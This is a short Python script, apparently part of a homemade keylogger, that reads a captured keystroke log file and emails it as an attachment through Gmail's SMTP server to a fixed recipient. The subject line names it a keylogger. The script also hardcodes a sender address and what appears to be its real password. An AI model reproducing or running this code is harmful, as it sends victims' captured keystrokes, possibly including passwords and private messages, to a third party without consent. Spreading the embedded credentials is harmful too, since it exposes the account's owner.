
import email, smtplib, ssl 
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
    #import getpass
subject = "Python Keylogger"
body = "This is an email with Keylogs from Python Keylogger"
sender_email= "dsccyber7@gmail.com"
receiver_email = "festuskipkorir01@gmail.com"
#password = getpass.getpass("Type your password and press enter:")
password = "DSC@cyber7"

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["subject"] = subject

#add body to email
message.attach(MIMEText(body,"plain"))

filename = "/home/festusk/Desktop/cherooo/key_log.txt"
 
try:
    with open(filename,"rb") as attachment:
        part =MIMEBase ("application","octet-stream")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)

    part.add_header(
        "content-Disposition",
        f"attachment; filename={filename}",
    )
 # Add attachment to message and convert message to string
    message.attach(part)
    text =message.as_string()
except FileNotFoundError:
    print("check keylog file path")
    exit(1)
except:
    print("Error ocurred")
    exit(1)


try:
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com",465,context=context) as server:
        server.login(sender_email,password)
        server.sendmail(sender_email,receiver_email,text)
    print("Done")
except:
    print("server or Internet Error ocurred")
    